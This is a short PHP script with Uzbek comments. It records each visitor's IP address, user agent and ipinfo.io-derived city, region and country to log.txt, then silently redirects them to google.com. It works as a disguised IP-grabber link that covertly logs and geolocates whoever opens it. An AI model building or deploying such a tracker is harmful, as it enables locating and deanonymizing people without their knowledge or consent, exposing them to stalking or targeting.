<?php
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// ipinfo.io orqali joylashuv olish
$api_url = "http://ipinfo.io/{$ip}/json";
$response = @file_get_contents($api_url);

if ($response !== FALSE) {
    $location = json_decode($response, true);
    $city = $location['city'] ?? 'Noma’lum';
    $region = $location['region'] ?? 'Noma’lum';
    $country = $location['country'] ?? 'Noma’lum';
} else {
    $city = $region = $country = 'Noma’lum';
}

// Log faylga yozish
$log = "IP: $ip | Country: $country | Region: $region | City: $city | Agent: $agent | Time: $time\n";
file_put_contents("log.txt", $log, FILE_APPEND);

// Redirect qilish
header("Location: https://google.com");
exit();
?>
